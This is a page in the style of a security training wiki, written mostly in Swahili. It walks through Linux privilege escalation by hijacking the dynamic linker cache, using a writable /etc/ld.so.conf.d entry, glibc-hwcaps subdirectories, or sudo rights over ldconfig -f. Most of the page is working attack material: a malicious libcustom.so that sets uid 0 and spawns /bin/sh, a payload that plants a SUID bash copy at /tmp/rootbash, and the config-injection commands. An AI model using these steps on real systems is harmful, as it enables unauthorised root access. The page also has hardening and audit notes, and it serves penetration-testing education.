# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu ni labu inayolenga poisoning ya **system linker cache kupitia `/etc/ld.so.conf` au `ldconfig`**. Kwa missing-library injection, writable `RPATH`/`RUNPATH`, `LD_PRELOAD`, na matumizi mengine ya jumla ya SUID linker abuse, angalia [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Andaa mazingira

Katika sehemu ifuatayo unaweza kupata code ya files tutakazotumia kuandaa mazingira

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Unda** faili hizo kwenye mashine yako katika folda hiyo hiyo
2. **Kompile** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Nakili** `libcustom.so` hadi `/usr/lib` na urefresh cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Kompile** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Kagua mazingira

Kagua kwamba _libcustom.so_ **inapakiwa** kutoka _/usr/lib_ na kwamba unaweza **kutekeleza** binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Amri muhimu za triage

Unaposhambulia target halisi, thibitisha **jina kamili la library** ambalo binary inahitaji, kile loader **inachoresolve kwa sasa**, na ni paths zipi zilizosanidiwa zinaweza kuandikiwa bila kubadilisha live cache.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Tumia `ldd` tu kwenye executable **inayoaminika**. Baadhi ya implementations au ELF interpreters zisizo za kawaida zinaweza kusababisha itekeleze code inayodhibitiwa na attacker; `objdump -p ./file | grep NEEDED` huorodhesha direct dependencies kwa usalama. Kwa target inayoaminika, kuendesha interpreter iliyogunduliwa kwa `--list` huonyesha resolution halisi.<sup>[[4]](#references)</sup>

Kuna mambo kadhaa muhimu ya kuzingatia:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` kwa kawaida **haifanyi kazi** kwa sababu redirection inafanywa na shell yako ya sasa. Tumia
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` badala yake.
- Binaries za **SUID/privileged** hupuuza `LD_LIBRARY_PATH`/`LD_PRELOAD` katika
**secure-execution mode**, lakini directories zinazotoka kwenye `/etc/ld.so.conf` bado ni sehemu ya trusted loader configuration, hivyo misconfiguration hii bado inaweza kuathiri privileged programs.<sup>[[1]](#references)</sup>
- `LD_DEBUG` pia hupuuza katika secure-execution mode isipokuwa `/etc/suid-debug` iwepo, kwa hiyo kusanya trace yake kutoka kwenye non-SUID run inayolingana badala ya kutarajia output kutoka kwenye privileged execution.<sup>[[1]](#references)</sup>
- Kwenye matoleo mapya ya glibc, dynamic loader pia hutoa
`--list-diagnostics`, ambayo ni muhimu kwa ku-debug cache resolution na
uteuzi wa `glibc-hwcaps` subdirectory wakati hijack haifanyi kazi kama ilivyotarajiwa.<sup>[[1]](#references)</sup>

### Vikwazo vya Cache na SONAME

`ldconfig` haihifadhi kila arbitrary file katika directory iliyosanidiwa: huchunguza ELF headers, hutambua majina yanayolingana na `lib*.so*` au `ld-*.so*`, na hutazamia chain ya kawaida ya `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Kwa hiyo injected object lazima iwe na target architecture/class, jina kamili la `DT_NEEDED` (kwa kawaida `DT_SONAME` yake), pamoja na symbols/versions zozote ambazo victim huresolve.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Prefer a library maalum kwa target kama ilivyo kwenye mfano huu. Kufunika SONAME ya kawaida kwa object isiyokamilika kunaweza kuvuruga kila process inayoi-resolve kabla target yenye privileged haijaendeshwa.<sup>[[3]](#references)</sup>

## Exploit

Katika scenario hii tutachukulia kwamba **mtu ameunda entry yenye vulnerability** ndani ya file katika _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Folda iliyo hatarini ni _/home/ubuntu/lib_ (ambapo tuna writable access).\
**Pakua na compile** code ifuatayo ndani ya path hiyo:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Ikiwa unatarajia **root** (au akaunti nyingine yenye marupurupu) kutekeleza binary yenye dosari baadaye, kwa kawaida ni bora kuacha **artifact inayomilikiwa na root** badala ya kuanzisha interactive shell. Kwa mfano:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Kisha, baada ya utekelezaji wenye privileges kufanyika, unaweza kutumia `/tmp/rootbash -p`.

Sasa kwa kuwa **tumeunda library hasidi ya libcustom ndani ya** path **iliyowekwa vibaya**, cache chaguo-msingi lazima ijengwe upya kupitia uendeshaji wenye mafanikio wa privileged **`ldconfig`**. Kuwasha upya mfumo husaidia tu pale ambapo mchakato wa ndani wa kuwasha mfumo huiendesha; la sivyo, subiri hatua ya administrator au tumia sudo rule isiyo salama ikiwa inapatikana.<sup>[[2]](#references)</sup>

Baada ya hili kufanyika, **kagua tena** mahali ambapo executable ya `sharedvuln` inapakia library ya `libcustom.so` kutoka:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Kama unavyoona, **inaipakia kutoka `/home/ubuntu/lib`** na ikiwa mtumiaji yeyote ataitekeleza, shell itatekelezwa:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Kumbuka kwamba katika mfano huu hatujaongeza privileges, lakini kwa kurekebisha commands zinazotekelezwa na **kusubiri root au privileged user mwingine atekeleze binary iliyo hatarini** tutaweza kuongeza privileges.

### Modern `glibc-hwcaps` shadowing

Tangu glibc 2.33, loader inaweza kupendelea libraries zilizoboreshwa zilizo chini ya `glibc-hwcaps/<level>/` ndani ya **kila library search directory**. Kwa hiyo, kuangalia `/home/ubuntu/lib` pekee hakutoshi: subdirectory inayoweza kuandikwa na inayooana, kama `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, inaweza ku-shadow library ya msingi baada ya `ldconfig` kui-index, huku CPUs nyingine zikiendelea kutumia base object. Hii pia hutoa hijack inayochagua architecture, ambayo inaweza kukosa kugunduliwa validation inapofanyika kwenye CPU tofauti.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Mwongozo wa sasa wa hardening wa glibc unapendekeza kuepuka SONAMEs zilizorudiwa, maeneo yasiyo ya default ya utafutaji, na objects zilizo katika subdirectories za `glibc-hwcaps`. Kwa mtazamo wa audit, tumia ukaguzi wa ownership na writeability kwa kujirudia kwenye directories zilizosanidiwa na vipengele vya parent path zao.<sup>[[3]](#references)</sup>

### Misconfigurations nyingine - vuln ileile

Katika mfano uliotangulia tulitengeneza misconfiguration ambapo administrator **aliweka folder isiyo na privileged ndani ya configuration file iliyo ndani ya `/etc/ld.so.conf.d/`**.\
Lakini kuna misconfigurations nyingine zinazoweza kusababisha vulnerability ileile; ikiwa una **write permissions** katika **config file** yoyote iliyo ndani ya `/etc/ld.so.conf.d`, kwenye folder `/etc/ld.so.conf.d` au kwenye file `/etc/ld.so.conf`, unaweza kusanidi vulnerability ileile na kuiexploit.

## Exploit 2

**Tuseme una sudo privileges juu ya `ldconfig`**.\
Unaweza kuonyesha `ldconfig` **mahali pa kupakia conf files**, hivyo tunaweza kutumia hilo kufanya `ldconfig` ipakie folders kiholela.<sup>[[2]](#references)</sup>\
Kwa hiyo, hebu tutengeneze files na folders zinazohitajika kupakia "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Sasa, kama ilivyoonyeshwa katika **previous exploit**, **unda library hasidi ndani ya `/tmp`**.\
Na mwishowe, hebu tupakie path na tuangalie binary inapakia library kutoka wapi:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Kama unavyoona, ukiwa na sudo privileges juu ya `ldconfig` unaweza kutumia vulnerability hiyo hiyo.** Maelezo ya chaguo ni muhimu wakati wa kutathmini sudo rule yenye vikwazo: `-f` huchagua configuration nyingine lakini bado huunda upya `/etc/ld.so.cache`; `-C` huelekeza cache mahali pengine; `-N` huzuia kujenga upya cache; na `-X` huzuia masasisho ya links lakini **bado huunda upya cache isipokuwa itumike pamoja na `-N`**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - Maktaba ya GNU C](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
{{#include ../../banners/hacktricks-training.md}}
